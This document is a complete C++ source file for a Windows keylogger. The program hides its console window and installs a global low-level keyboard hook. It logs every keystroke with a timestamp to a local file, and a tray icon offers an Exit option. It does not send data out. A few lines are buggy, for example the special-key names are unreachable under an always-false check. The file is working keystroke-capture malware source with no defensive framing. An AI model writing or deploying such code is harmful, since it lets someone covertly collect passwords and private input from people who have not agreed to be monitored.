#include <windows.h>
#include <fstream>
#include <ctime>
#include <string>
#include <iostream>

HHOOK g_hook = NULL;
std::ofstream g_logFile("KeyLog.txt", std::ios::app);
bool g_running = true;

#define WM_TRAYICON (WM_USER + 1)
#define TRAY_ICON_ID 1001
NOTIFYICONDATA nid = {};
const wchar_t CLASS_NAME[] = L"keyLogger";

LRESULT CALLBACK HiddenWndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
    switch (msg) {
        case WM_TRAYICON:
            switch (LOWORD(lParam)) {
                case WM_LBUTTONUP:
                    break;
                case WM_RBUTTONUP: {
                    POINT pt;
                    GetCursorPos(&pt);
                    SetForegroundWindow(hwnd);

                    HMENU hMenu = CreatePopupMenu();
                    AppendMenu(hMenu, MF_STRING, 1, L"Exit");

                    TrackPopupMenu(hMenu, TPM_BOTTOMALIGN | TPM_LEFTALIGN, pt.x, pt.y, 0, hwnd, nullptr);
                    DestroyMenu(hMenu);
                    break;
                }
            }
            break;

        case WM_COMMAND:
            if (LOWORD(wParam) == 1) {
                PostQuitMessage(0);
            }
            break;

        case WM_DESTROY:
            PostQuitMessage(0);
            break;
    }
    return DefWindowProc(hwnd, msg, wParam, lParam);
}


void setupTray(HINSTANCE hInstance) {
    WNDCLASS wc = {};
    wc.lpfnWndProc = HiddenWndProc;
    wc.hInstance = hInstance;
    wc.lpszClassName = CLASS_NAME;
    RegisterClass(&wc);

    HWND hwnd = CreateWindowEx(0, CLASS_NAME, L"HiddenWindow", WS_OVERLAPPEDWINDOW,
                               0, 0, 0, 0, nullptr, nullptr, hInstance, nullptr);

    nid.cbSize = sizeof(nid);
    nid.hWnd = hwnd;
    nid.uID = TRAY_ICON_ID;
    nid.uFlags = NIF_MESSAGE | NIF_ICON | NIF_TIP;
    nid.uCallbackMessage = WM_TRAYICON;
    nid.hIcon = LoadIcon(nullptr, IDI_APPLICATION);
    wcscpy_s(nid.szTip, L"Key Logger");

    Shell_NotifyIcon(NIM_ADD, &nid);

    MSG msg;
    while (GetMessage(&msg, nullptr, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    Shell_NotifyIcon(NIM_DELETE, &nid);
    DestroyWindow(hwnd);
    UnregisterClass(CLASS_NAME, hInstance);
}


std::string GetTimestamp() {
    time_t now = time(0);
    struct tm tstruct;
    char buf[80];
    localtime_s(&tstruct, &now);
    strftime(buf, sizeof(buf), "%Y-%m-%d %X", &tstruct);
    return buf;
}

std::string GetKeyName(DWORD vkCode) {
    wchar_t keyNameW[256] = {0};

    UINT scanCode = MapVirtualKey(vkCode, MAPVK_VK_TO_VSC);
    LONG lParam = scanCode << 16;

    if (vkCode == 0) {
        switch (vkCode) {
            case VK_SHIFT: return "[SHIFT]";
            case VK_CONTROL: return "[CTRL]";
            case VK_MENU: return "[ALT]";
            case VK_ESCAPE: return "[ESC]";
            case VK_RETURN: return "[ENTER]";
            case VK_SPACE: return "[SPACE]";
            case VK_BACK: return "[BACKSPACE]";
            case VK_TAB: return "[TAB]";
            case VK_CAPITAL: return "[CAPSLOCK]";
            case VK_LEFT: return "[LEFT ARROW]";
            case VK_RIGHT: return "[RIGHT ARROW]";
            case VK_UP: return "[UP ARROW]";
            case VK_DOWN: return "[DOWN ARROW]";
            case VK_PRIOR: return "[PAGE UP]";
            case VK_NEXT: return "[PAGE DOWN]";
            case VK_HOME: return "[HOME]";
            case VK_END: return "[END]";
            case VK_INSERT: return "[INSERT]";
            case VK_DELETE: return "[DELETE]";
            case VK_NUMLOCK: return "[NUMLOCK]";
            case VK_SNAPSHOT: return "[PRINT SCREEN]";
            case VK_SCROLL: return "[SCROLL LOCK]";
            case VK_PAUSE: return "[PAUSE]";
            default: return "[UNKNOWN]";
        }
    }

    if (GetKeyNameTextW(lParam, keyNameW, 256)) {
        char keyNameA[256] = {0};
        std::cout << lParam;
        WideCharToMultiByte(CP_ACP, 0, keyNameW, -1, keyNameA, 256, NULL, NULL);
        return keyNameA;
    }

    return "[Unknown]";
}

LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0) {
        KBDLLHOOKSTRUCT* pKey = (KBDLLHOOKSTRUCT*)lParam;

        if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {
            std::string keyName = GetKeyName(pKey->vkCode);
            g_logFile << "[" << GetTimestamp() << "] Key pressed: " << keyName << std::endl;
        }
    }

    return CallNextHookEx(g_hook, nCode, wParam, lParam);
}

void SetHook() {
    g_hook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);
    if (g_hook == NULL) {
        std::cout << "Failed to install hook";
    }
}

void ReleaseHook() {
    if (g_hook != NULL) {
        UnhookWindowsHookEx(g_hook);
        g_hook = NULL;
    }
}

void MessageLoop() {
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0) && g_running) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
}

void HideConsole() {
    HWND hwnd = GetConsoleWindow();
    ShowWindow(hwnd, SW_HIDE);
}

int main() {
    HideConsole();

    SetHook();

    HINSTANCE hInstance = GetModuleHandle(nullptr);
    setupTray(hInstance);

    MessageLoop();

    return 0;
}
